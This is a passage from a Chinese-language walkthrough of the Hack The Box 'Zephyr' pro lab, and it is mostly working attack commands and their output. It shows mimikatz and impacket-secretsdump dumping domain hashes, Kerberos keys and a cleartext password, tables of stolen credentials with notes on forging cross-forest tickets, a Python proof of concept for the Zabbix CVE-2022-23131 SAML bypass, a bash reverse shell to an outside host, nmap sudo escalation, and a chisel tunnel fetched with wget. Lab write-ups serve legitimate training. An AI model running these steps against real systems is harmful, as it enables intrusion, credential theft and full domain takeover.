User Account Control : 01010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION )
Object Security ID   : S-1-5-21-1470357062-2280927533-300823338-1107
Object Relative ID   : 1107

Credentials:
  Hash NTLM: c87a64622a487061ab81e51cc711a34b

mimikatz(commandline) # exit
Bye!
```

### lsadump::sam
```plain
C:\Windows\system32>C:\Users\Public\mimikatz.exe "privilege::debug" "lsadump::sam" exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::sam
Domain : DC
SysKey : 26e642aeb927768190bf01f71ffcc079
Local SID : S-1-5-21-904537713-2251106281-648342985

SAMKey : 46259cc5903032263ccb31889d1ec479

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 5e3c0abbe0b4163c5612afe25c69ced6

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

mimikatz(commandline) # exit
Bye!
```

### sekurlsa::logonpasswords(失败)
```plain
C:\Windows\system32>C:\Users\Public\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz(commandline) # exit
Bye!
```

## secretsdump
> 得到凭据painters.htb\Matt:CLEARTEXT:L1f30f4Spr1ngCh1ck3n!
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-secretsdump heathc1iff:Pass@123@192.168.110.55
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x26e642aeb927768190bf01f71ffcc079
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
PAINTERS\DC$:aes256-cts-hmac-sha1-96:3ed6c9f397b46b39a4099ef6ffb834168f1b7abedde82561cee74d3f2cfb1f73
PAINTERS\DC$:aes128-cts-hmac-sha1-96:c26f7ec4b891b19151704ac3a45ae0fe
PAINTERS\DC$:des-cbc-md5:c4b99b5ec76bb5c1
PAINTERS\DC$:plain_password_hex:f1e223bb02500686631057a53dbbbff423ebc5664b1cd267bd081b768d2cbcb9938882e143b530ba28156026d9903257f2ced1173a6795809e3e3d36bda4c236804cab3bb70eecaadd196afe757493262552fb6e38646fc87845d5ac55b55e50ffd399e1ed6cec8bb8efc7144904701586b9f3c93011be4d1c466e5b90585ac8175ef10d2b27ae87b7c763b0e3425325b43140c634e2faa952ae80163e4b296d13bcf0446c75907775a72820caf741a7d35e978cbdbc6daa559b5513783ba258b7604263686767bbb263df03e758aa8806122808a157172684d80547c0945c1dcfb348e0d5a54d2d1334da4f8075898f
PAINTERS\DC$:aad3b435b51404eeaad3b435b51404ee:5869ab656006ee71af41d437a6788093:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xfecd1b4601f1f1becf33b389ffa2eff5d8bc8cd3
dpapi_userkey:0x6130d2e50c7b21539230412422edeb0071253077
[*] NL$KM 
 0000   48 6D D8 24 3E D2 25 7B  96 58 D1 98 1B 7A E3 57   Hm.$>.%{.X...z.W
 0010   79 5B C9 17 D2 E7 E7 1A  F9 48 B4 9F D8 6D 1E A8   y[.......H...m..
 0020   F8 9B 47 1C B9 E3 B2 E1  CE FC 2C 92 48 01 39 25   ..G.......,.H.9%
 0030   A3 AA D4 45 A3 F4 A5 A8  4B 9B DE 1F 86 A7 5B B7   ...E....K.....[.
NL$KM:486dd8243ed2257b9658d1981b7ae357795bc917d2e7e71af948b49fd86d1ea8f89b471cb9e3b2e1cefc2c9248013925a3aad445a3f4a5a84b9bde1f86a75bb7
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b59ffc1f7fcd615577dab8436d3988fc:::
riley:1106:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
blake:1107:aad3b435b51404eeaad3b435b51404ee:c87a64622a487061ab81e51cc711a34b:::
gavin:1108:aad3b435b51404eeaad3b435b51404ee:cb8ec920398da9fbb7c33b7b613b28d5:::
daniel:1109:aad3b435b51404eeaad3b435b51404ee:b084c663ad3f214e516e6f89c81c80d7:::
tom:1110:aad3b435b51404eeaad3b435b51404ee:dc51a409ab6cf835cbb9e471f27d8bc6:::
web_svc:1111:aad3b435b51404eeaad3b435b51404ee:502472f625746727fa99566032383067:::
painters.htb\Matt:4101:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
heathc1iff:20601:aad3b435b51404eeaad3b435b51404ee:c87a64622a487061ab81e51cc711a34b:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:5869ab656006ee71af41d437a6788093:::
PNT-SVRSVC$:1103:aad3b435b51404eeaad3b435b51404ee:c206d294c947cecc0e60955004ff96c5:::
PNT-SVRBPA$:1104:aad3b435b51404eeaad3b435b51404ee:2dfcebbe9f5f4cb3bf98032887b3d7b6:::
PNT-SVRPSB$:1105:aad3b435b51404eeaad3b435b51404ee:7fc6b6b4b44a96617b5829a888b5a85a:::
MAINTENANCE$:2101:aad3b435b51404eeaad3b435b51404ee:6db918e3d0a23093360a17711ac9c59a:::
WORKSTATION-1$:2103:aad3b435b51404eeaad3b435b51404ee:9ab46ef513f6f74ddf1ab492b8f542fa:::
ZSM$:2102:aad3b435b51404eeaad3b435b51404ee:e32c342fb51f05ec34a78483ba5167ba:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:d5d7a2fd36d4ede3aaf21537b504df92a32e2e70c37187efe42b6263897ead36
Administrator:aes128-cts-hmac-sha1-96:f6139559372a236bde1524329d2aa492
Administrator:des-cbc-md5:807c2a64b3c8b379
krbtgt:aes256-cts-hmac-sha1-96:39610acedf7a66db295ee28263e7ad75234ae7884dbde20a4890bf97f7b8872b
krbtgt:aes128-cts-hmac-sha1-96:9a6c9880f96f75edd17f648206fb5abd
krbtgt:des-cbc-md5:25f2432654101f40
riley:aes256-cts-hmac-sha1-96:2c9f84f81d7a76eb1f29193107fd2e51834962cc90cfcfafef7ab4baabe59360
riley:aes128-cts-hmac-sha1-96:bc65c97f9324894006a5e389ab91ccec
riley:des-cbc-md5:3e018f85012cc8b0
gavin:aes256-cts-hmac-sha1-96:fa583a1938a32986a2c23f7787aa2c3282b96259c89070a01a19e256b58f9992
gavin:aes128-cts-hmac-sha1-96:fbcae12c4967569b398868fb38f0b300
gavin:des-cbc-md5:b54f67f19d8ab367
daniel:aes256-cts-hmac-sha1-96:8bb18fd1df9c7eecfa5c4de65ca4fda6c37efc98a2c94ef8edf8a4e606bc6ffd
daniel:aes128-cts-hmac-sha1-96:ba81e1c1fb60c279aa5c685ede732c8e
daniel:des-cbc-md5:a7455b207f1570ad
tom:aes256-cts-hmac-sha1-96:657f8676662fc4f5ad5bca4c19f1576ff1ce200fa5418860a5483f99d0d05888
tom:aes128-cts-hmac-sha1-96:b1c6797bf5e899d09cf865d30470bb7c
tom:des-cbc-md5:2aea89cb23b6f246
web_svc:aes256-cts-hmac-sha1-96:bc2600db46b90a0deffc6a34f60f9574b82ede49e71d4cf337f11ddf290993d8
web_svc:aes128-cts-hmac-sha1-96:e9c960b6403d6aa5b6b79885e1cc11b0
web_svc:des-cbc-md5:e6b986ae31e34a20
painters.htb\Matt:aes256-cts-hmac-sha1-96:42656beb2852a473c35498f55fbe113d4d722bb2efb36b1689d9b1a60e9cfa03
painters.htb\Matt:aes128-cts-hmac-sha1-96:a79e61bd0ca1d5760d5178e6010af2f7
painters.htb\Matt:des-cbc-md5:624c3458945b4675
heathc1iff:aes256-cts-hmac-sha1-96:67a6f0e2942de6f0f9943e8ff66e29f6e73b0fb8d0d0ca6f19346dc1e8d610ca
heathc1iff:aes128-cts-hmac-sha1-96:13348a1cf6bde2473863b3f812082897
heathc1iff:des-cbc-md5:91049eec793da845
DC$:aes256-cts-hmac-sha1-96:3ed6c9f397b46b39a4099ef6ffb834168f1b7abedde82561cee74d3f2cfb1f73
DC$:aes128-cts-hmac-sha1-96:c26f7ec4b891b19151704ac3a45ae0fe
DC$:des-cbc-md5:5e3b4cb002b3f289
PNT-SVRSVC$:aes256-cts-hmac-sha1-96:a31b4a0de42a441e47dad46f283105a9eeaf023831336cf2b2933c2907a63c4a
PNT-SVRSVC$:aes128-cts-hmac-sha1-96:0f5239792536fef683f21de1925b8ca4
PNT-SVRSVC$:des-cbc-md5:0db9624308c7c76b
PNT-SVRBPA$:aes256-cts-hmac-sha1-96:09f22fb6cd45a7a633854dcb861371f7af81676d336121d383c35328c127bee4
PNT-SVRBPA$:aes128-cts-hmac-sha1-96:a064d5c19ffd7dc845c31cbc9bbcc85d
PNT-SVRBPA$:des-cbc-md5:cdec8ff8e9041cb0
PNT-SVRPSB$:aes256-cts-hmac-sha1-96:543458b7a3d85c5f48438b5096ba4653e73ca7291b797691ee96368255ffbab6
PNT-SVRPSB$:aes128-cts-hmac-sha1-96:5db252e5f61efa9b6cfa4404ccc975e7
PNT-SVRPSB$:des-cbc-md5:29f78975e5f20b7f
MAINTENANCE$:aes256-cts-hmac-sha1-96:31846c6b8b5f7a6116d7e2e7a7f3d4b4f4eda46f6dda8e3170a340f387bdb56c
MAINTENANCE$:aes128-cts-hmac-sha1-96:ccb136a8d9d5eed3308a6c4a9a31fc8c
MAINTENANCE$:des-cbc-md5:eaadcb1fc4b0d334
WORKSTATION-1$:aes256-cts-hmac-sha1-96:f65b04cc76d8dc57579d12a0b29b294f6fc25c947fbf7e5dde6c3639330f73c0
WORKSTATION-1$:aes128-cts-hmac-sha1-96:729c49ae39c12a40da4ffb2267366f87
WORKSTATION-1$:des-cbc-md5:f4e00e6bcbe35e62
ZSM$:aes256-cts-hmac-sha1-96:2a763a4ca146de4dafcd0b29921bd3a658d23fb813a418ec69bfd09f973a0422
ZSM$:aes128-cts-hmac-sha1-96:e85c62a41f30f0f1eab466bfa8e2345f
ZSM$:des-cbc-md5:3885a8dc08e36258
[*] ClearText passwords grabbed
painters.htb\Matt:CLEARTEXT:L1f30f4Spr1ngCh1ck3n!
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-secretsdump -k -no-pass \
    painters.htb/Administrator@DC.painters.htb     
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x26e642aeb927768190bf01f71ffcc079
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
PAINTERS\DC$:plain_password_hex:f1e223bb02500686631057a53dbbbff423ebc5664b1cd267bd081b768d2cbcb9938882e143b530ba28156026d9903257f2ced1173a6795809e3e3d36bda4c236804cab3bb70eecaadd196afe757493262552fb6e38646fc87845d5ac55b55e50ffd399e1ed6cec8bb8efc7144904701586b9f3c93011be4d1c466e5b90585ac8175ef10d2b27ae87b7c763b0e3425325b43140c634e2faa952ae80163e4b296d13bcf0446c75907775a72820caf741a7d35e978cbdbc6daa559b5513783ba258b7604263686767bbb263df03e758aa8806122808a157172684d80547c0945c1dcfb348e0d5a54d2d1334da4f8075898f
PAINTERS\DC$:aad3b435b51404eeaad3b435b51404ee:5869ab656006ee71af41d437a6788093:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xfecd1b4601f1f1becf33b389ffa2eff5d8bc8cd3
dpapi_userkey:0x6130d2e50c7b21539230412422edeb0071253077
[*] NL$KM 
 0000   48 6D D8 24 3E D2 25 7B  96 58 D1 98 1B 7A E3 57   Hm.$>.%{.X...z.W
 0010   79 5B C9 17 D2 E7 E7 1A  F9 48 B4 9F D8 6D 1E A8   y[.......H...m..
 0020   F8 9B 47 1C B9 E3 B2 E1  CE FC 2C 92 48 01 39 25   ..G.......,.H.9%
 0030   A3 AA D4 45 A3 F4 A5 A8  4B 9B DE 1F 86 A7 5B B7   ...E....K.....[.
NL$KM:486dd8243ed2257b9658d1981b7ae357795bc917d2e7e71af948b49fd86d1ea8f89b471cb9e3b2e1cefc2c9248013925a3aad445a3f4a5a84b9bde1f86a75bb7
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b59ffc1f7fcd615577dab8436d3988fc:::
riley:1106:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
blake:1107:aad3b435b51404eeaad3b435b51404ee:c87a64622a487061ab81e51cc711a34b:::
gavin:1108:aad3b435b51404eeaad3b435b51404ee:cb8ec920398da9fbb7c33b7b613b28d5:::
daniel:1109:aad3b435b51404eeaad3b435b51404ee:b084c663ad3f214e516e6f89c81c80d7:::
tom:1110:aad3b435b51404eeaad3b435b51404ee:dc51a409ab6cf835cbb9e471f27d8bc6:::
web_svc:1111:aad3b435b51404eeaad3b435b51404ee:502472f625746727fa99566032383067:::
painters.htb\Matt:4101:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:5869ab656006ee71af41d437a6788093:::
PNT-SVRSVC$:1103:aad3b435b51404eeaad3b435b51404ee:c206d294c947cecc0e60955004ff96c5:::
PNT-SVRBPA$:1104:aad3b435b51404eeaad3b435b51404ee:2dfcebbe9f5f4cb3bf98032887b3d7b6:::
PNT-SVRPSB$:1105:aad3b435b51404eeaad3b435b51404ee:7fc6b6b4b44a96617b5829a888b5a85a:::
MAINTENANCE$:2101:aad3b435b51404eeaad3b435b51404ee:6db918e3d0a23093360a17711ac9c59a:::
WORKSTATION-1$:2103:aad3b435b51404eeaad3b435b51404ee:9ab46ef513f6f74ddf1ab492b8f542fa:::
ZSM$:2102:aad3b435b51404eeaad3b435b51404ee:34a7599355eef8f4e4a72ec902a109a4:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:d5d7a2fd36d4ede3aaf21537b504df92a32e2e70c37187efe42b6263897ead36
Administrator:aes128-cts-hmac-sha1-96:f6139559372a236bde1524329d2aa492
Administrator:des-cbc-md5:807c2a64b3c8b379
krbtgt:aes256-cts-hmac-sha1-96:39610acedf7a66db295ee28263e7ad75234ae7884dbde20a4890bf97f7b8872b
krbtgt:aes128-cts-hmac-sha1-96:9a6c9880f96f75edd17f648206fb5abd
krbtgt:des-cbc-md5:25f2432654101f40
riley:aes256-cts-hmac-sha1-96:2c9f84f81d7a76eb1f29193107fd2e51834962cc90cfcfafef7ab4baabe59360
riley:aes128-cts-hmac-sha1-96:bc65c97f9324894006a5e389ab91ccec
riley:des-cbc-md5:3e018f85012cc8b0
gavin:aes256-cts-hmac-sha1-96:fa583a1938a32986a2c23f7787aa2c3282b96259c89070a01a19e256b58f9992
gavin:aes128-cts-hmac-sha1-96:fbcae12c4967569b398868fb38f0b300
gavin:des-cbc-md5:b54f67f19d8ab367
daniel:aes256-cts-hmac-sha1-96:8bb18fd1df9c7eecfa5c4de65ca4fda6c37efc98a2c94ef8edf8a4e606bc6ffd
daniel:aes128-cts-hmac-sha1-96:ba81e1c1fb60c279aa5c685ede732c8e
daniel:des-cbc-md5:a7455b207f1570ad
tom:aes256-cts-hmac-sha1-96:657f8676662fc4f5ad5bca4c19f1576ff1ce200fa5418860a5483f99d0d05888
tom:aes128-cts-hmac-sha1-96:b1c6797bf5e899d09cf865d30470bb7c
tom:des-cbc-md5:2aea89cb23b6f246
web_svc:aes256-cts-hmac-sha1-96:bc2600db46b90a0deffc6a34f60f9574b82ede49e71d4cf337f11ddf290993d8
web_svc:aes128-cts-hmac-sha1-96:e9c960b6403d6aa5b6b79885e1cc11b0
web_svc:des-cbc-md5:e6b986ae31e34a20
painters.htb\Matt:aes256-cts-hmac-sha1-96:42656beb2852a473c35498f55fbe113d4d722bb2efb36b1689d9b1a60e9cfa03
painters.htb\Matt:aes128-cts-hmac-sha1-96:a79e61bd0ca1d5760d5178e6010af2f7
painters.htb\Matt:des-cbc-md5:624c3458945b4675
DC$:aes256-cts-hmac-sha1-96:3ed6c9f397b46b39a4099ef6ffb834168f1b7abedde82561cee74d3f2cfb1f73
DC$:aes128-cts-hmac-sha1-96:c26f7ec4b891b19151704ac3a45ae0fe
DC$:des-cbc-md5:5e3b4cb002b3f289
PNT-SVRSVC$:aes256-cts-hmac-sha1-96:a31b4a0de42a441e47dad46f283105a9eeaf023831336cf2b2933c2907a63c4a
PNT-SVRSVC$:aes128-cts-hmac-sha1-96:0f5239792536fef683f21de1925b8ca4
PNT-SVRSVC$:des-cbc-md5:0db9624308c7c76b
PNT-SVRBPA$:aes256-cts-hmac-sha1-96:09f22fb6cd45a7a633854dcb861371f7af81676d336121d383c35328c127bee4
PNT-SVRBPA$:aes128-cts-hmac-sha1-96:a064d5c19ffd7dc845c31cbc9bbcc85d
PNT-SVRBPA$:des-cbc-md5:cdec8ff8e9041cb0
PNT-SVRPSB$:aes256-cts-hmac-sha1-96:543458b7a3d85c5f48438b5096ba4653e73ca7291b797691ee96368255ffbab6
PNT-SVRPSB$:aes128-cts-hmac-sha1-96:5db252e5f61efa9b6cfa4404ccc975e7
PNT-SVRPSB$:des-cbc-md5:29f78975e5f20b7f
MAINTENANCE$:aes256-cts-hmac-sha1-96:31846c6b8b5f7a6116d7e2e7a7f3d4b4f4eda46f6dda8e3170a340f387bdb56c
MAINTENANCE$:aes128-cts-hmac-sha1-96:ccb136a8d9d5eed3308a6c4a9a31fc8c
MAINTENANCE$:des-cbc-md5:eaadcb1fc4b0d334
WORKSTATION-1$:aes256-cts-hmac-sha1-96:f65b04cc76d8dc57579d12a0b29b294f6fc25c947fbf7e5dde6c3639330f73c0
WORKSTATION-1$:aes128-cts-hmac-sha1-96:729c49ae39c12a40da4ffb2267366f87
WORKSTATION-1$:des-cbc-md5:f4e00e6bcbe35e62
ZSM$:aes256-cts-hmac-sha1-96:d89ed6980b5e01526245a908d3ba49883e6e49fce38f8447ca0f7d7d46f4846e
ZSM$:aes128-cts-hmac-sha1-96:8df25aa8a708d67a03ca5462baf1797b
ZSM$:des-cbc-md5:0dfb380845497c40
[*] ClearText passwords grabbed
painters.htb\Matt:CLEARTEXT:L1f30f4Spr1ngCh1ck3n!
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```

## 域内凭据整理
### 域控
| 用户名 | 类型 | NTLM Hash | 说明 |
| --- | --- | --- | --- |
| Administrator | Domain Admin | 5bdd6a33efe43f0dc7e3b2435579aa53 | ⭐ 直接域控 |
| krbtgt | Kerberos | b59ffc1f7fcd615577dab8436d3988fc | ⭐ Golden Ticket 核心 |
| Administrator | Domain Admin | 5e3c0abbe0b4163c5612afe25c69ced6 | ⭐ 直接域控 |


---

###  特殊账号
| 用户名 | 类型 | 凭据 | 特殊权限 |
| --- | --- | --- | --- |
| blake | Domain User | c87a64622a487061ab81e51cc711a34b | TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION |
| Matt | CLEARTEXT | L1f30f4Spr1ngCh1ck3n! | 特殊凭据 |


---

### 普通域用户
| 用户名 | NTLM Hash |
| --- | --- |
| gavin | cb8ec920398da9fbb7c33b7b613b28d5 |
| tom | dc51a409ab6cf835cbb9e471f27d8bc6 |
| daniel | b084c663ad3f214e516e6f89c81c80d7 |
| Matt | 5e3c0abbe0b4163c5612afe25c69ced6 |
| riley | e19ccf75ee54e06b06a5907af13cef42 |
| web_svc | 502472f625746727fa99566032383067 |


---

### 机器账户
| 主机名 | NTLM Hash |
| --- | --- |
| PNT-SVRBPA$ | 2dfcebbe9f5f4cb3bf98032887b3d7b6 |
| DC$ | 5869ab656006ee71af41d437a6788093 |
| PNT-SVRSVC$ | c206d294c947cecc0e60955004ff96c5 |
| PNT-SVRPSB$ | 7fc6b6b4b44a96617b5829a888b5a85a |
| WORKSTATION-1$ | 9ab46ef513f6f74ddf1ab492b8f542fa |


---

### 跨域信任账户
| 账户 | 类型 | NTLM Hash | 说明 |
| --- | --- | --- | --- |
| ZSM$ | Trust Account | e32c342fb51f05ec34a78483ba5167ba | ⭐ 跨森林信任密钥 |


 👉 **可以伪造跨域 Kerberos 票据**

** **👉** **❗**你可以“假装自己是 zsm 域里的任意用户”**❗**  **

---

# PAINTERS\Matt-192.168.110.51
> 我们在secretsdump中拿到一份特殊的凭据Matt:L1f30f4Spr1ngCh1ck3n!
>
> 结合我们之前在passwd中发现的matt用户，尝试登陆
>

## ssh登录
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/PrintSpoofer]
└─# ssh matt@10.10.110.35
matt@10.10.110.35's password: L1f30f4Spr1ngCh1ck3n!
matt@mail:~$ 
```

## sudo
### sudo -l
```plain
matt@mail:~$ sudo -l
Matching Defaults entries for matt on mail:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User matt may run the following commands on mail:
    (ALL : ALL) ALL
```

### 提权
```plain
matt@mail:~$ sudo -i
[sudo] password for matt: L1f30f4Spr1ngCh1ck3n!
root@mail:
```

## Getflag
```plain
root@mail:~# cat flag.txt
ZEPHYR{L34v3_N0_St0n3_Un7urN3d}
```

# zsm.local-192.168.210.13
## Zabbix
![](/image/hackthebox-prolabs/Zephyr-11.png)

### 认证绕过
[CVE-2022-23131 Zabbix SAML SSO认证绕过漏洞 - wavesky - 博客园](https://www.cnblogs.com/wavesky/p/16366406.html)

#### code
```plain
# coding

import sys
import requests
import re,base64,urllib.parse,json
# 禁用警告
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def runPoc(url):
    response = requests.get(url,verify=False)

    cookie = response.headers.get("Set-Cookie")

    sessionReg = re.compile("zbx_session=(.*?);")
    try:
        session = re.findall(sessionReg,cookie)[0]

        base64_decode = base64.b64decode(urllib.parse.unquote(session,encoding="utf-8"))
        session_json = json.loads(base64_decode)

        payload = '{"saml_data":{"username_attribute":"Admin"},"sessionid":"%s","sign":"%s"}'%(session_json["sessionid"],session_json["sign"])

        print("未加密Payload：" + payload)
        print('\n')
        payload_encode = urllib.parse.quote(base64.b64encode(payload.encode()))

        print("加密后Payload：" + payload_encode)

    except IndexError:
        print("[-] 不存在漏洞")

if __name__ == '__main__':
    try:
        url = sys.argv[1]
        runPoc(url)
    except IndexError:
        print("""
    Use: python CVE-2022-23131.py http://xxxxxxxxx.com""")

```

#### run
```plain
┌──(kali㉿kali)-[~/Desktop/tools/Zabbix SAML SSO]
└─$ proxychains -q python CVE-2022-23131.py https://192.168.210.13/
未加密Payload：{"saml_data":{"username_attribute":"Admin"},"sessionid":"768d03dde0a8246d58c9257a8ab6cd1c","sign":"zGehhT7WSZ38xaT2mtUmyC4T9L/XlS1rJEpb6/lHuVhUHuu59Yvl96hWnZPM/NfGImWSk0LxY5hdpWBZdl6Zqg=="}


加密后Payload：eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiNzY4ZDAzZGRlMGE4MjQ2ZDU4YzkyNTdhOGFiNmNkMWMiLCJzaWduIjoiekdlaGhUN1dTWjM4eGFUMm10VW15QzRUOUwvWGxTMXJKRXBiNi9sSHVWaFVIdXU1OVl2bDk2aFduWlBNL05mR0ltV1NrMEx4WTVoZHBXQlpkbDZacWc9PSJ9
```

![](/image/hackthebox-prolabs/Zephyr-12.png)

更换cookie后点击触发

#### exploit
![](/image/hackthebox-prolabs/Zephyr-13.png)

进入后台后，利用脚本执行功能拿 Shell

### 反弹shell
在Administrator界面下Scripts功能点处进行反弹shell

![](/image/hackthebox-prolabs/Zephyr-14.png)

```plain
bash -c 'bash -i >& /dev/tcp/10.10.16.8/80 0>&1'
```

```plain
pwncat-cs -p 80
```

在Monitoring的Hosts中选择Name触发脚本即可

![](/image/hackthebox-prolabs/Zephyr-15.png)

![](/image/hackthebox-prolabs/Zephyr-16.png)

### nmap提权
#### sudo 
```plain
(remote) zabbix@zephyr:/$ sudo -l
Matching Defaults entries for zabbix on zephyr:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User zabbix may run the following commands on zephyr:
    (root) NOPASSWD: /usr/bin/nmap
```

#### exploit
```plain
(remote) zabbix@zephyr:/$ echo 'os.execute("/bin/bash -p")' > /tmp/exp.lua
(remote) zabbix@zephyr:/$ sudo nmap -O 127.0.0.1 --script=/tmp/exp.lua

Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-21 07:38 UTC
NSE: Warning: Loading '/tmp/exp.lua' -- the recommended file extension is '.nse'.
root@zephyr:/#
```

## Getflag
```plain
ZEPHYR{Abu51ng_d3f4ul7_Func710n4li7y_ftw}
```

## 搭建隧道
```plain
wget 10.10.16.8/chisel -O /tmp/chisel
chmod 777 /tmp/chisel
/tmp/chisel client 10.10.16.8:443 R:socks
```

## 数据库读取
```plain
root@zephyr:/# cat /var/www/html/conf/zabbix.conf.php
<?php
// Zabbix GUI configuration file.

$DB['TYPE']                             = 'MYSQL';
$DB['SERVER']                   = 'localhost';
$DB['PORT']                             = '0';
$DB['DATABASE']                 = 'zabbix';
$DB['USER']                             = 'zabbix';
$DB['PASSWORD']                 = 'rDhHbBEfh35sMbkY';

// Schema name. Used for PostgreSQL.
$DB['SCHEMA']                   = '';

// Used for TLS connection.
$DB['ENCRYPTION']               = false;
$DB['KEY_FILE']                 = '';
$DB['CERT_FILE']                = '';
$DB['CA_FILE']                  = '';
$DB['VERIFY_HOST']              = false;
$DB['CIPHER_LIST']              = '';

// Vault configuration. Used if database credentials are stored in Vault secrets manager.
$DB['VAULT_URL']                = '';
$DB['VAULT_DB_PATH']    = '';
$DB['VAULT_TOKEN']              = '';

// Use IEEE754 compatible value range for 64-bit Numeric (float) history values.
// This option is enabled by default for new Zabbix installations.
// For upgraded installations, please read database upgrade notes before enabling this option.
$DB['DOUBLE_IEEE754']   = true;

$ZBX_SERVER                             = 'localhost';
$ZBX_SERVER_PORT                = '10051';
$ZBX_SERVER_NAME                = '';

$IMAGE_FORMAT_DEFAULT   = IMAGE_FORMAT_PNG;

// Uncomment this block only if you are using Elasticsearch.
// Elasticsearch url (can be string if same url is used for all types).
//$HISTORY['url'] = [
//      'uint' => 'http://localhost:9200',
//      'text' => 'http://localhost:9200'
//];
// Value types stored in Elasticsearch.
//$HISTORY['types'] = ['uint', 'text'];

// Used for SAML authentication.
// Uncomment to override the default paths to SP private key, SP and IdP X.509 certificates, and to set extra settings.
$SSO['SP_KEY']                  = 'conf/certs/sp.key';
$SSO['SP_CERT']                 = 'conf/certs/sp.crt';
$SSO['IDP_CERT']                = 'conf/certs/idp.cer';
//$SSO['SETTINGS']              = [];
```

## 连接数据库
```plain
